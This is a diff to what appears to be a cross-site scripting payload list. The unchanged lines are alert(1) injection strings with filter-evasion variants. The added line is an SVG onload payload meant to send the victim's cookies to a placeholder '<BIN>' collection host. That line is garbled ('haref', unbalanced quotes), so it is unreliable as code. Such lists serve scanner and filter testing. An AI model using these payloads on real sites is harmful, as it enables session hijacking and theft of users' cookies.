@@ -306,6 +306,7 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 `"'><img src=xxx:x onerror\x20=javascript:alert(1)>
 `"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
 `"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+"><svg onx=() onload=(location.haref='<BIN>/¿mycookies='+document['cookie"])()>
 <script>javascript:alert(1)<\x00/script>
 <img src=# onerror\x3D"javascript:alert(1)" >
 <input onfocus=javascript:alert(1) autofocus>
